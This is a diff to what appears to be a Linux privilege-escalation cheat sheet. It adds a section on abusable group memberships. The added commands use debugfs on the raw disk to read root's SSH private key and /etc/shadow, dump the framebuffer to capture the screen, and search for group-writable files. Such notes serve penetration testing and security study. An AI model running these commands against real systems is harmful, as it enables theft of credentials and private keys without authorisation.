@@ -15,7 +15,19 @@
   - IFS Exploit
   - LD_PRELOAD Exploit
   - Symlinks
-  
+
+## Groups 
+- shadow - can read /etc/shadow
+- disk - raw access to files 
+  - debugfs /dev/sda1
+  - debugfs: cat /root/.ssh/id_rsa
+  - debugfs: cat /etc/shadow
+- video - access to framebuffer
+  - cat /dev/fb0 > /tmp/screen.raw
+  - cat /sys/class/graphics/fb0/virtual_size
+- root
+  - find / -group root -perm -g=w 2>/dev/null
+
 ## Process
 
 Process ID of a port:
